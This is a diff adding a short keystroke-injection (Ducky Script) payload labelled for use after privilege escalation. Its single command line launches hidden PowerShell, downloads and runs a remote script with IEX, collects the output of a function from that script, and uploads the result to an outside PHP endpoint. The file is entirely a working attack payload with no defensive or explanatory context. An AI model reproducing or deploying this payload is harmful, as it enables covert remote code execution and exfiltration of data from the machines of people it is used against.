@@ -1,0 +1,3 @@
+REM --------Kalvin Klein----(Admin CMD/post priv esc)------
+REM 
+STRING powershell -WindowStyle hidden "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ninja-Tw1sT/Calvin-Klein/master/CK.ps1'); Get-CalvinKlein | Clip; $output=Get-Clipboard; (New-Object Net.WebClient).UploadString('https://www.killerkali.com/CK/rx.php', $output)"
